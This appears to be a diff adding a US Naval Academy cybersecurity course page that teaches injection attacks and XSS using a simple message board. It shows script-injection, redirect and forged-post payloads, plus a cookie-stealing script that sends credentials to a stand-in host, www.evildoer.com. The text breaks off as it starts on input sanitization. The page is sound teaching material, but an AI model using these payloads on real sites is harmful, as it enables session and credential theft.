@@ -1,0 +1,729 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head;
+         any other head content must come *after* these tags -->
+
+    <!-- Icon to use on the browser bar -->
+    <link rel="icon" href="calendar/images/web-icon.png">
+
+    <!-- Bootstrap core CSS -->
+    <link href="calendar/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+    <!-- Skeleton CSS -->
+    <link rel="stylesheet" href="calendar/Skeleton/css/normalize.css">
+    <link rel="stylesheet" href="calendar/Skeleton/css/skeleton.css">
+    <link rel="stylesheet" href="calendar/css/skeleton-modifications.css">
+
+    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
+    <link href="calendar/bootstrap3-ie10-viewport-bug-workaround/ie10-viewport-bug-workaround.css" rel="stylesheet">
+
+    <!-- Fonts -->
+    <link href='calendar/fonts/raleway.css' rel='stylesheet' type='text/css'>
+
+    <!-- Ace Code Editor - https://ace.c9.io/ -->
+    <script type="text/javascript" src="calendar/ace-builds/src-noconflict/ace.js" charset="utf-8">
+    </script>
+
+    <!-- Chart.js - http://www.chartjs.org -->
+    <script type="text/javascript" src="calendar/chartjs/Chart.bundle.min.js" charset="utf-8">
+    </script>
+
+    <!-- To support challenge/response authentication within course notes-->
+        <script type="text/javascript">
+      var nonce = "4253563444f4a8fddc39f4ac62aafa528b81e9c218c6b61614a8e10045f2defa";
+    </script>
+    <script type="text/javascript" src="calendar/js/sha256.js"></script>
+    
+    <!-- Styles for the submission System -->
+    <link href="calendar/css/calendar-default.css" rel="stylesheet">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
+      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- MathJax -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ["\\(","\\)"] ],
+          processEscapes: true
+        }
+      });
+    </script>
+    <script type="text/javascript" src="../../ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML">
+    </script>
+
+    <!-- Highlight.js -->
+    <link rel="stylesheet" href="calendar/highlight/styles/color-brewer.css">
+    <script src='calendar/highlight/highlight.pack.js'></script>
+    <script>hljs.initHighlightingOnLoad();</script>
+
+    <!-- Font-Awesome -->
+    <link rel="stylesheet" type="text/css" href="calendar/Font-Awesome/css/font-awesome.min.css">
+
+    <!-- Datatables -->
+    <link rel="stylesheet" type="text/css" href="calendar/datatables.net/datatables.min.css">
+
+    <!-- Printing -->
+    <link rel="stylesheet" type="text/css" media="print" href="calendar/css/calendar-print.css">
+
+    <!-- Custom CSS based on user preferences -->
+    <link href='docs/sy110_cdrD.css' rel='stylesheet'>
+      
+      
+    <!-- Custom JavaScript based on user preferences -->
+
+    <!-- Bootstrap core JavaScript
+    ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+    <script src="calendar/jquery/js/jquery-3.3.1.min.js"></script>
+    <script src="calendar/bootstrap/js/bootstrap.min.js"></script>
+    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
+    <script src="calendar/bootstrap3-ie10-viewport-bug-workaround/ie10-viewport-bug-workaround.js"></script>
+    <!-- DataTables -->
+    <script type="text/javascript" src="calendar/datatables.net/datatables.min.js"></script>
+
+  <title>SY110 (Fall 2020)</title>
+
+  </head>
+  <body>
+
+    <!-- Fixed navbar -->
+    <nav class="navbar navbar-default navbar-fixed-top">
+      <div class="container">
+        <div class="navbar-header">
+          <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
+            <span class="sr-only">Toggle navigation</span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </button>
+          <!--
+            <a class="navbar-brand" href="#">
+              <img alt="Navbar!" src="css/images/web-icon.png" width="24">
+            </a>
+          -->
+        </div>
+        <div id="navbar" class="navbar-collapse collapse">
+          <ul class="nav navbar-nav">
+
+            <li><a href="calendar.php.html?load=home">
+                SY110 - Introduction to Cyber Security</a></li>
+
+            
+            <li><a title="Calendar" href="calendar.php-1.html?show=calendar_display">
+                <span class="glyphicon glyphicon-calendar" aria-hidden="true"></span>
+                </a></li>
+
+            <li><a title="Resources" href="calendar.php-2.html?load=resources">
+                <span class="glyphicon glyphicon-briefcase" aria-hidden="true"></span>
+                </a></li>
+
+            <li><a title="Information" href="calendar.php-3.html?load=policy">
+                <span class="glyphicon glyphicon-info-sign" aria-hidden="true"></span>
+                </a></li>
+
+        
+        
+          </ul>
+
+        
+          <ul class="nav navbar-nav navbar-right">
+            <li class="dropdown">
+<a href="#" title="View files associated with lecture" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">
+Injection Attacks and XSS
+</a>
+<ul class="dropdown-menu  scrollable-menu">
+<li class="dropdown-header">Options</li>
+<li><form method="post" class="navbar-form navbar-left" role="search" target="_blank">
+  <div class="input-group">
+    <input type="hidden" class="form-control" name="print" id="print">
+    <div class="input-group-btn">
+        <button class="btn btn-default" type="submit"><i class="glyphicon glyphicon-print"></i> Print</button>
+    </div>
+  </div>
+</form></li>
+<li><form method="get" class="navbar-form navbar-left" role="search">
+  <div class="input-group">
+    <input type="hidden" name="show" value="calendar_search">
+    <input type="text" class="form-control" placeholder="Search" name="search" id="search">
+    <div class="input-group-btn">
+        <button class="btn btn-default" type="submit"><i class="glyphicon glyphicon-search"></i></button>
+    </div>
+  </div>
+</form></li>
+<li><form method="post" class="navbar-form navbar-left" role="search" onsubmit="return hashPassword()">
+  <div class="input-group">
+    <input type="password" class="form-control" placeholder="Password" name="password" id="password">
+    <div class="input-group-btn">
+        <button class="btn btn-default" type="submit"><i class="glyphicon glyphicon-lock"></i></button>
+    </div>
+</div>
+</form></li>
+</ul>
+</li>
+            <li class="dropdown">
+              <a href="#" title="Select class" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">
+                <span class="glyphicon glyphicon-apple" aria-hidden="true"></span>
+                Class<span class="caret"></span></a>
+              <ul class="dropdown-menu  scrollable-menu">
+                <li><a href='calendar.php-4.html?type=class&event=1'>1 - Intro to the Cyber Domain</a></li>
+<li><a href='calendar.php-5.html?type=class&event=2'>2 - Aspects and Pillars of Cyber Security</a></li>
+<li><a href='calendar.php-6.html?type=class&event=3'>3 - Computer Architecture</a></li>
+<li><a href='calendar.php-7.html?type=class&event=4'>4 - Risk And Vulnerabilities</a></li>
+<li><a href='calendar.php-8.html?type=class&event=5'>5 - Policy And Law</a></li>
+<li><a href='calendar.php-9.html?type=class&event=6'>6 - Bits And Bytes And Files</a></li>
+<li><a href='calendar.php-10.html?type=class&event=7'>7 - OS-File Systems</a></li>
+<li><a href='calendar.php-11.html?type=class&event=8'>8 - OS-Permissions, Shell, And Remote Access</a></li>
+<li><a href='calendar.php-12.html?type=class&event=9'>9 - Web And HTML</a></li>
+<li><a href='calendar.php-13.html?type=class&event=10'>10 - JavaScript - Overview</a></li>
+<li><a href='calendar.php-14.html?type=class&event=11'>11 - Vulnerabilities and Malware</a></li>
+<li><a href='calendar.php-15.html?type=class&event=12'>12 - Cyberspace as a Human Domain</a></li>
+<li><a href='calendar.php-16.html?type=class&event=13'>13 - Client-Side Scripting: Part One</a></li>
+<li><a href='calendar.php-17.html?type=class&event=14'>14 - Client-Side Scripting: Part Two</a></li>
+<li><a href='calendar.php-18.html?type=class&event=15'>15 - Server-Side Scripting</a></li>
+<li><a href='calendar.php-19.html?type=class&event=16'>16 - Human Factors in Cyber Operations</a></li>
+<li><a href='calendar.php-20.html?type=class&event=17'>17 - Stack-Intro and Physical Layer</a></li>
+<li><a href='calendar.php-21.html?type=class&event=18'>18 - Stack - Data Link Layer</a></li>
+<li><a href='calendar.php-22.html?type=class&event=19'>19 - Stack - Network Layer</a></li>
+<li><a href='calendar.php-23.html?type=class&event=20'>20 - Stack - Transport Layer</a></li>
+<li><a href='calendar.php-24.html?type=class&event=21'>21 - Stack - Application Layer</a></li>
+<li><a href='calendar.php-25.html?type=class&event=22'>22 - Wireless</a></li>
+<li><a href='calendar.php-26.html?type=class&event=23'>23 - Network Security Appliances and Firewalls</a></li>
+<li><a href='calendar.php-27.html?type=class&event=24'>24 - Symmetric Encryption</a></li>
+<li><a href='calendar.php-28.html?type=class&event=25'>25 - Asymmetric Encryption</a></li>
+<li><a href='calendar.php-29.html?type=class&event=26'>26 - Steganography</a></li>
+<li><a href='calendar.php-30.html?type=class&event=27'>27 - Digital Forensics</a></li>
+<li><a href='calendar.php-31.html?type=class&event=28'>28 - Cyber Recon</a></li>
+<li><a href='calendar.php-32.html?type=class&event=29'>29 - Attackers And Defenders</a></li>
+<li><a href='calendar.php-33.html?type=class&event=30'>30 - Cyber Attack</a></li>
+<li><a href='calendar.php-34.html?type=class&event=31'>31 - Cyber Defense</a></li>
+              </ul>
+            </li>
+                        <li class="dropdown">
+              <a href="#" title="Select lab" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">
+                <span class="glyphicon glyphicon-knight" aria-hidden="true"></span>
+                Lab<span class="caret"></span></a>
+              <ul class="dropdown-menu  scrollable-menu">
+                <li><a href='calendar.php-35.html?type=lab&event=1'>1 - Computer Architecture And Supply Chain</a></li>
+<li><a href='calendar.php-36.html?type=lab&event=2'>2 - Windows-Unix Shell And Command Line</a></li>
+<li><a href='calendar.php-37.html?type=lab&event=3'>3 - Introduction to Build a Website</a></li>
+<li><a href='calendar.php-38.html?type=lab&event=4'><font color='black'><b>4 - Injection Attacks and XSS</b></font></a></li>
+<li><a href='calendar.php-39.html?type=lab&event=5'>5 - LAN-WLAN</a></li>
+<li><a href='calendar.php-40.html?type=lab&event=6'>6 - Hashing And Passwords</a></li>
+<li><a href='calendar.php-41.html?type=lab&event=7'>7 - Digital Certificates</a></li>
+<li><a href='calendar.php-42.html?type=lab&event=8'>8 - Digital Forensics</a></li>
+<li><a href='calendar.php-43.html?type=lab&event=9'>9 - Cyber Recon</a></li>
+<li><a href='calendar.php-44.html?type=lab&event=10'>10 - Cyber Attack</a></li>
+<li><a href='calendar.php-45.html?type=lab&event=11'>11 - Cyber Defense</a></li>
+<li><a title='Material not online at this time' href='#'><span style='color=#AAAAAA'>12 - _archive</span></a></li>
+              </ul>
+            </li>
+            
+          </ul>
+        </div><!--/.nav-collapse -->
+      </div>
+    </nav>
+
+  <!-- End TopBar and CSS Stuff! -->
+<!-- Begin providing the contents of the page -->
+<div class="container">
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/HTML4/loose.dtd">
+<html lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/HTML;charset=utf-8">
+    <meta http-equiv="Content-Style-Type" content="text/css">
+    <meta http-equiv="Content-Script-Type" content="text/javascript">
+    <title>BRAND: Injection Attacks &amp; XSS</title>
+
+  </head>
+  <body>
+    <div class="header">
+
+      <div class="noScreen">
+        <h1>Injection Attacks and XSS</h1>
+      </div>
+    </div>
+    
+    <div class="learnObjs">
+      <h2>Learning Outcomes</h2>
+      <p>
+        After completing these activities you should be able to:
+      </p>
+      <ul>
+        <li>Define injection attacks and cross-site scripting (XSS) and be able to discuss what it is used for.</li>
+      </ul>
+    </div>    
+<br><br>
+<!--
+<center>
+  <p class="sec">
+  <font size="5"><a href="lab_worksheet.pdf">XSS/Injection Lab Worksheet</a></font>
+  </p>
+</center>
+-->
+<!--Instructor information-->
+
+
+    
+    <p class="sec">
+      <h2>Anatomy of our simple message board</h2>
+      Now that you've seen how <a class="glossLink" href="calendar.php-76.html?load=glossary#F"><code>&lt;FORM&gt;</code>s</a> and <a class="glossLink" href="calendar.php-76.html?load=glossary#S">server side scripts</a> work, you've got all the tools you need to understand how the simple message board we've been using in class works, which is important because most non-trivial websites have the same basic architecture &mdash; just not in anywhere so simple a form.
+      <ol class="inst">
+        <li>The user goes to <code>http://midn.cyber.usna.edu/~smith/msg/mb.html</code> and enters "Hello World!".
+          <table>
+            <tr>
+              <td><b>mb.html as rendered by <a class="glossLink" href="calendar.php-76.html?load=glossary#B">browser</a></b></td>
+              <td><b>mb.html <a class="glossLink" href="calendar.php-76.html?load=glossary#H">HTML</a> Source Code</b></td>
+            </tr>
+            <tr>
+              <td><b>Message Board</b>
+                <hr><form onsubmit="return false;">
+                <input type="text" name="msg" style='width:150pt; color:#ff0000;' value="Hello World!">
+                <input type="button" onclick="return false;" value="post message">
+                </form>
+                <br>
+              </td>
+              <td>
+                <pre>
+&lt;HTML&gt;
+  &lt;BODY&gt;
+    &lt;H1&gt;Message Board&lt;/H1&gt;
+    &lt;HR&gt;
+    &lt;FORM action="mb.cgi"&gt;
+      &lt;INPUT type="text" name="msg"&gt;
+      &lt;INPUT type="button" onclick="submit()" value="post message"&gt;
+    &lt;/FORM&gt;
+  &lt;/BODY&gt;
+&lt;/HTML&gt;</pre>
+              </td>
+            </tr>
+          </table>
+        </li>
+        <li>The user presses the <em>post message</em> button and the browser sends the <a class="glossLink" href="calendar.php-76.html?load=glossary#S">server</a> a "<a class="glossLink" href="calendar.php-76.html?load=glossary#G">GET</a>" request with <a class="glossLink" href="calendar.php-76.html?load=glossary#U">URL</a>
+          <pre>http://midn.cyber.usna.edu/~smith/msg/mb.cgi?msg=<span style="color:#ff0000;">Hello+World!</span></pre>
+        </li>
+        <li>The server executes the <a class="glossLink" href="calendar.php-76.html?load=glossary#S">script</a> mb.cgi with input <span style="color:#ff0000;">Hello World!</span>. The script modifies the <a class="glossLink" href="calendar.php-76.html?load=glossary#F">file</a> mb.html by inserting <pre>&lt;b&gt;smith&lt;/b&gt;: <span style="color:#ff0000;">Hello World!</span></pre> into the body of the HTML code.  In other words, your message is inserted literally character-by-character, prefaced by your username (in bold).</li>
+        <li>The server then sends the browser simple HTML code that <a class="glossLink" href="calendar.php-76.html?load=glossary#R">redirects</a> it back to mb.html (i.e. <a class="glossLink" href="calendar.php-76.html?load=glossary#D">document</a>.location = http://midn.cyber.usna.edu/~smith/msg/mb.html).</li>
+        <li>The browser displays the new version of mb.html.
+          <table>
+            <tr>
+              <td><b>mb.html as rendered by browser</b></td>
+              <td><b>mb.html HTML code</b></td>
+            </tr>
+            <tr>
+              <td><b>Message Board</b>
+                <hr><span style="color:#ff0000;"><b>smith</b>: Hello World!</span><br>
+                  <form onsubmit="return false;">
+                    <input type="text" name="msg" style='width:150pt;'>
+                    <input type="button" onclick="return false;" value="post message">
+                  </form>
+                <br>
+              </td>
+              <td>
+<pre>
+&lt;HTML&gt;
+  &lt;BODY&gt;
+    &lt;H1&gt;Message Board&lt;/H1&gt;
+    <span class="red">&lt;B&gt;smith&lt;/B&gt;: Hello World!</span>
+    &lt;HR&gt;
+    &lt;FORM action="mb.cgi"&gt;
+      &lt;INPUT type="text" name="msg"&gt;
+      &lt;INPUT type="button" onclick="submit()" value="post message"&gt;
+    &lt;/FORM&gt;
+  &lt;/BODY&gt;
+&lt;/HTML&gt;</pre>
+              </td>
+            </tr>
+          </table>
+        </li>
+      </ol>
+      <p>
+        <div class="annotation">The one big difference between our simple message board and more sophisticated systems is that their server scripts send the user-data they receive to a <em>database</em> (a system for storing and retrieving data) rather than directly changing files in the server scripts. When the web server for such sites serve up pages to browsers, what's in the page depends on the information in the database.</div>
+        It's important to understand this architecture for the following discussions, but it's also important because big complex sites fit the same basic pattern:  The user enters data into a form on their browser, submitting the form sends data to the server, which executes a script that processes that data. The script actually changes files on the server, so that the next time a browser requests one of those files, the content received by the browser has changed.
+      
+    
+
+    <p class="sec">
+      <h2>Injection Attacks</h2>
+      Since the message board includes whatever text we enter into the box literally, i.e. character-for-character, we can add a little spice to our posting.  For example, if I (as user <code>smith</code>) post the message
+      <pre>
+I &lt;u&gt;hate&lt;/u&gt; waking up early!</pre>
+      to the board, the result will be that anyone viewing the message board sees <div class="quotation"> I <u>hate</u> waking up early!</div> I could, for example, post an image by entering something like this: <pre style="clear: right;">Check out this picture &lt;img src="https://blackincense.files.wordpress.com/2008/10/skeptical-cat-is-fraught-with-skepticism1.jpg"&gt;</pre> And you can post <a class="glossLink" href="calendar.php-76.html?load=glossary#L">links</a>, and other things as well.  I could even, post a <em>script</em>!  Suppose I posted the following "message": <pre style="clear: right;">&lt;script type="text/javascript"&gt;var i = 0; while (i &lt; 100) { document.write("GO NAVY! "); i = i + 1; }&lt;/script&gt;</pre>
+    <div class="fleet" style="clear:right;">
+      <h1>Injection Attack on a US Navy Site</h1><br>  Hackers hit a U.S. Navy website used to assist sailors and their families relocate to a new station. The site was vulnerable to an SQL injection attack, which enabled the attacker to gain login information for the site, including usernames, passwords, and email addresses.
+      <p>
+        Sometimes data sent in HTML forms are processed by a server that manages a <a class="glossLink" href="calendar.php-76.html?load=glossary#C">computer</a> database. If the form input data is not sanitized, a malicious user may be able to trick the database server into revealing some or all of its data by injecting database commands into the form. The language used to interact with databases is called Structured Query Language (SQL), which is why this type of attack is known as an SQL injection attack.
+      </p>
+      <p>
+        As a result of the attack, the targeted site was immediately shutdown and a few weeks later it was permanently retired.
+      </p>
+    </div>
+    When that's included in the message board, character-for-character, the result is that a browser <a class="glossLink" href="calendar.php-76.html?load=glossary#R">rendering</a> the page will insert 100 "GO NAVY!"s at the point of my message.  Cute, right?  The problem is, this opens up the door to allowing message board users to wreck havoc upon the poor little website.  What if I put 1000000000 instead of 100 in the above "message"?  What if <code>while (1 == 1)</code> in the above  code rather than <code>while (i &lt; 100)</code>?  What if I posted <pre>&lt;script type="text/javascript"&gt;document.location="http://www.usma.edu";&lt;/script&gt;</pre> on the message board? All of these examples show that it is easy to take down the message board, i.e. render it totally unavailable to anyone (Which <em>Pillar of Cyber Security</em> pertains to a service being available?), by injecting <em>code</em> into the <em>data</em> that gets sent to  the server.  This kind of attack is called an <em><a class="glossLink" href="calendar.php-76.html?load=glossary#I">injection</a> attack</em> for that very reason, and is a general kind of attack.  In fact, we already saw an example of an injection attack when we tricked the guess-a-number game and were able to win in one guess every time.  We'll look at several examples of how we can use injection attacks to do more subtle and devious things than just disable the page, and then we'll look at how we can protect a website like the message board against injection attacks.
+  
+    <p class="sec">
+      <div class="bareannotation" style="clear: right;">
+        <img src="calendar-44.php?key=2e799260bfab2565ff7ab16860c93936b8a9de5c&type=lab&event=4" width="100px">
+      </div>
+      <h2>Authentication and Cookies</h2>
+      The message board is set up so that anyone may view it, but you can only post to it with a message board account.  Moreover, everything you post is prefaced with your username, so we know who posts what. <a class="glossLink" href="calendar.php-76.html?load=glossary#A"><em>Authentication</em></a> &mdash; verifying that you are who you say you are &mdash; is critical to providing security both in cyberspace and out.  We'll discuss authentication in more detail later in the course, but authentication by username and password is something you should all be familiar with.
+    <p>
+      The obvious way (not the best way!) to do password protection is to have the usernames and passwords stored on the server, and have the user supply them when he asks for protected pages.  But what if the whole site is supposed to be protected? One way is to have you provide your username and password     every
+      time your browser makes a GET request to the
+      web server.
+      This is clearly too much of a pain in the neck for us users!
+      Next simplest plan for password-authenticated websites: have
+      your web-browser save your username and
+      password on your machine, so that it can retrieve them and send
+      them automatically with every request it makes to that web server.
+      That's how the message board works.
+      <div class="annotation" style="clear: right;">A better plan than storing the username
+  and password in a cookie is to store a <em>session key</em> -
+  a random number that serves as   username and password <em>for
+  this session only</em>.  The session key gets stored locally as
+  a cookie and is sent with every request
+  to the server.  This protects the actual password, so that
+  someone who hijacks one session can't do it again.
+      </div>
+
+      Because neither the browser nor the user are likely to know
+      how different web servers are going to work in this regard,
+      the system is set up so that the server tells the browser
+      what to store, the browser doesn't decide on its own.
+    
+
+    <p>
+      The name for locally (i.e. on the browser's machine) stored
+      information associated with a particular website is <a class="glossLink" href="calendar.php-76.html?load=glossary#C"><em>cookie</em></a>.  Be aware that these are on your machine and
+      could be misused by bad people.  You can disable cookies
+      in your browser, but then all sorts of sites won't work.
+      (Yet another functionality vs. security trade-off!)
+      You can also wipe the browser's cookie memory periodically.
+    </p>
+
+    <div class="news" style="clear: right;">
+      <b>IE10 to have "Do Not Track" enabled by default</b><br> <em>Privacy</em> is related to security, but not quite the same.  Web browsing has tons of privacy implications &mdash; and
+      not good ones.  Web-sites and third-party businesses do a whole bunch of "tracking" of online behavior, and they are often able to put together a fairly comprehensive picture of your online
+      activities.  Think about that!  Cookies and <a class="glossLink" href="calendar.php-76.html?load=glossary#J">Javascript</a> play a
+      big role in doing that kind of thing.
+      A new standard called "<a href="../../issues/do-not-track.html">Do Not Track</a>"
+      proposes an extension to <a class="glossLink" href="calendar.php-76.html?load=glossary#H">HTTP</a> that allows browsers to send
+      a "do not track" request within a regular GET.  It only amounts
+      to asking politely, but many well-known websites have pledged to
+      honor these requests.
+      Firefox, Safari and Opera allow uses to turn "do not track" on,
+      it's not the default.  Microsoft made big news in the Summer of 2012 by
+      <a href="http://blogs.technet.com/b/microsoft_on_the_issues/archive/2012/08/07/do-not-track-in-the-windows-8-set-up-experience.aspx">announcing that "do not track" would be enabled by default in
+      IE10</a>
+    </div>
+
+
+    <p>
+      The cookie for page with URL X gets sent with every request
+      to a page in the subtree rooted X's directory.  That way you
+      don't have to re-enter username and password for each page in
+      a site.
+      Cookies are sent in the HTTP traffic as part of the "GET"
+      request, but not in the URL, simply as additional HTTP info.
+      <a href="cookie1.html">This is what an HTTP "GET" request
+  with cookies looks like.</a>
+    </p>
+    
+
+    <p class="sec">
+      <h2>Reflection</h2>
+      Javascript code can access the cookie for the current page
+      with the <a class="glossLink" href="calendar.php-76.html?load=glossary#V">variable</a> <code>document.cookie</code>.  Thus, the
+      code <code><a class="glossLink" href="calendar.php-76.html?load=glossary#A">alert</a>(document.cookie)</code> inserted into the
+      message board by any one user will cause everyone
+      who looks at the page to see <b>their own cookie</b>.
+      Because the cookie you see depends on who's viewing the
+      code, not who posted the code.  It's like a mirror, in a way.
+      <p>
+  This point is really important, so let's be concrete with an
+  example.
+  Suppose we have users mXXXXXX, mYYYYYY and mZZZZZZ with
+  passwords rab, foo and bar respectively.  User mXXXXXX posts
+  <pre>&lt;script type="text/javascript"&gt;alert(document.cookie);&lt;/script&gt;</pre>
+  to the message board.  Now that script is embedded in the
+  message board, i.e. it is <a class="glossLink" href="calendar.php-76.html?load=glossary#C">client-side script</a> that will be
+  executed by the browser of anyone visiting the message board.
+  Next suppose user mYYYYYY visits the message board.  Her
+  browser executes the script code put there by mXXXXXX and
+  up pops an alert box that says:
+  <pre>
+    uname=mYYYYYY&amp;pswd=foo
+  </pre>
+  ... because <em>her</em> browser has <em>her</em> cookies.
+  Next suppose user mZZZZZZ visits the message board.  His
+  browser executes the script code put there by mZZZZZZ and
+  up pops an alert box that says:
+  <pre>
+    uname=mZZZZZZ&amp;pswd=bar
+  </pre>
+  ... because <em>his</em> browser has <em>his</em> cookies.
+      
+
+    
+
+
+    <p class="sec">
+      <h2>Cross Site Scripting (XSS)</h2>
+      If we combine <em>injection</em> and <em>reflection</em> we get
+      an example of what's called a <em>cross site scripting
+      (XSS)</em> attack.  Let's look at an example using the message
+      board.  Suppose we have message board users  mYYYYYY and mZZZZZZ with
+  passwords foo and bar respectively.  An evildoer, MIDN mXXXXXX
+      perhaps, creates a web page the following script embedded in it:
+      <pre>&lt;script type="text/javascript"&gt;document.location="http://midn.cyber.usna.edu/~smith/msg/mb.cgi?msg=Die+Bart+die!";&lt;/script&gt;</pre>
+      If he can trick mYYYYYY into visiting his web page, <em>and</em>
+      she happens to have logged into Prof. Smith's message board page
+      already during that browser session, then here's what happens:
+      <ol>
+  <li>
+    MIDN mYYYYYY's browser executes the script on the evildoer's web page</li>
+  <li>
+    The script causes the browser to send a
+    <code>GET /~smith/msg/mb.cgi?msg=Die+Bart+die!"</code>
+    request to the server <code>midn.cyber.usna.edu</code>.  Since mYYYYYY has
+    a cookie for that page (from having logged in previously),
+    her cookie &mdash; containing her username and password &mdash;
+    gets sent to the server <code>midn.cyber.usna.edu</code>.
+  </li>
+  <li>
+    The server <code>midn.cyber.usna.edu</code> receives the GET
+    request with mYYYYYY's username and password, and so inserts
+    the message "Die Bar die!" prefaced with <em>mYYYYYY</em>'s
+    username.
+  </li>
+      </ol>
+      So now there is a message board post from mYYYYYY threatening
+      this poor Bart person.  Of course mYYYYYY didn't cause the post
+      to happen, the evildoer mXXXXXX did that.  But there's no way
+      to tell that fact from the perspective of the message board and
+      the message board web server <code>midn.cyber.usna.edu</code>.
+      The GET request that caused the message to be posted was sent
+      from mYYYYYY's browser with her username and password, just as
+      if she'd typed it in the message board web page herself.
+      <p>
+  The essence of this kind of attack is that the evildoer sets
+  things up so that the victim's browser executes a script, and
+  that means the script runs with the credentials
+  (username/password in this case) of the victim.
+  It might not seem that serious when we're just attacking the
+  message board.  However, what if we did a similar thing with a
+  bank account rather than a message board, and instead of
+  posting a threat we tricked the code we sent caused funds to
+  be transferred?
+      </p>
+    
+
+    <div class="annotation">
+      <b>Teach a man to phish ...</b><br>
+      <a class="glossLink" href="calendar.php-76.html?load=glossary#P">Phishing</a> is very common.  In fact, even though your e-mail
+      account has spam filters that try to detect phishing e-mails and
+      block them from appearing in your inbox, you're very likely to
+      see one now and then.  Check out
+      <a href="http://courses.cyber.usna.edu/SY110/resources/22.spam/index.html">The SY110 SPAM Page</a>
+      for some examples of SPAM that's made it into USNA inboxes.
+    </div>
+
+
+    <p class="sec">
+      <h2>Email and XSS, Phishing and <a class="glossLink" href="calendar.php-76.html?load=glossary#S">Spear Phishing</a></h2>
+      The big problem for the evildoer in the previous example is how
+      to get the victim to visit the web page he's created that
+      contains the script.
+      One way is through an e-mail that contains a link to the
+      evildoer's website.
+      <p>
+  A <em>Phishing</em> approach is to send out a blanket e-mail
+  to a large number of people hoping that, out of all of
+  them, <em>someone</em> will click on the link
+  <em>and</em> happen to be logged in to the message board at
+  the time.  You try to make the e-mail enticing or make it look
+  legitimate, but your real hope is that out of enough people
+  you'll find that someone.
+      </p>
+      <p>
+  A <em>Spear Phishing</em> approach is to identify one
+  or a small number of targets,
+  do some research on them (e.g. check Facebook, twitter,
+  company websites, etc), and craft an e-mail based on that
+  knowledge that they're especially likely to accept as
+  legitimate and, therefore, for which they're likely to click
+  on the link to the evildoer's website.
+      </p>
+      <p>
+  Of course if an e-mail <a class="glossLink" href="calendar.php-76.html?load=glossary#C">client</a> (i.e. a <a class="glossLink" href="calendar.php-76.html?load=glossary#P">program</a> for reading
+  e-mail) runs scripts embedded in HTML-formatted e-mail, we
+  don't need the victim to click on anything: we could simply
+  embed a script in the e-mail that sets
+  <code>document.location</code> to the evildoer's website.
+  In that case, merely opening the e-mail would send you to the
+  site.  For this reason, most e-mail clients refuse to
+  run Javascript embedded in an e-mail.  Hopefully you now see
+  why!
+      </p>
+    
+
+
+    <p class="sec">
+      <h2>An effective attack on the message board</h2>
+      In class, along with the other attacks above, your instructor
+      (acting as the evildoer)
+      ran a <em>really</em> effective attack on the message board.
+      It went something like this:
+      <ol>
+  <li>The evildoer has his own web server at <code>www.evildoer.com</code></li>
+  <li>The evildoer posts to the message board a message like
+    this:
+    <pre>Here's a nice picture: &lt;script type="text/javascript"&gt;document.write('&lt;img src="http://www.evildoer.com/kitten.jpg?' + document.cookie + '"&gt;');&lt;/script&gt;</pre>
+  </li>
+  <li>
+    The innocent Midshipman mYYYYYY (password foo) logs into
+    the message board and pulls it up.
+    In rendering the message board, mYYYYYY's browser executes
+    the code in the script, which inserts the <code>img</code> <a class="glossLink" href="calendar.php-76.html?load=glossary#E">element</a>:
+    <pre>&lt;img src="http://www.evildoer.com/kitten.jpg?uname=mYYYYYY&amp;passwd=foo"&gt;</pre>
+    ... into the body of the message board's HTML code.
+  </li>
+  <li>
+    Midshipman mYYYYYY's browser sends the request to
+    <code>www.evildoer.com</code> to
+    GET the file <code>/kitten.jpg?uname=mYYYYYY&amp;passwd=foo</code>
+  </li>
+  <li>
+    The evildoer's web server receives this GET request
+    and, like all GET requests to the server, it gets saved in
+    the web server logs.
+    The evildoer's website will still send back a nice picture
+    of a kitten, but the damage will have been done.
+  </li>
+  <li>
+    Finally, the evildoer checks his web server logs and finds
+    <pre>GET /kitten.jpg?uname=mYYYYYY&amp;passwd=foo HTTP/1.1</pre>
+    and, lo and behold, he has mYYYYYY's username and password!
+  </li>
+      </ol>
+      This attack is quite mean, because from mYYYYYY's perspective,
+      nothing seems to be wrong.  She saw a nice picture of a kitten,
+      and that's all.  No hint that now the evildoer has her username
+      and password.
+    
+
+    <p class="sec">
+      <h2>Protecting against injection attacks: sanitizing input</h2>
+      We've seen a lot of nasty things in this lesson (and even in
+      some previous lessons) that can be done with injection attacks.
+      It's time to ask what we can do about it?  How can we protect
+      ourselves?
+      Fundamentally, we can't just take input from a user (in this
+      case the "message" they want to post) and stick it into our
+      message board. Instead, we have <em>sanitize</em> the input.
+      That means remove or render harmless anything that might cause
+      trouble. Sanitizing input is a huge issue in practice, precisely
+      because the risk of injection attack is so high.
+
+      <p>
+  Here's the sledgehammer approach to sanitizing our message board
+  input:  You can't have any HTML or embedded Javascript
+  code without &lt; and &gt;, so if we <em>escaped</em> those
+  characters before putting the message into the message board,
+  nobody could do an injection attack.  There are a variety of
+  ways to escape them, but since their <a class="glossLink" href="calendar.php-76.html?load=glossary#A">ASCII</a> values are 60 and
+  62, the following works: replace &#60; with &amp;#60; and
+  &#62; with &amp;#62;.  Here's a little bit of Javascript code
+  that does it.   Assuming you have a variable <code>msg</code>
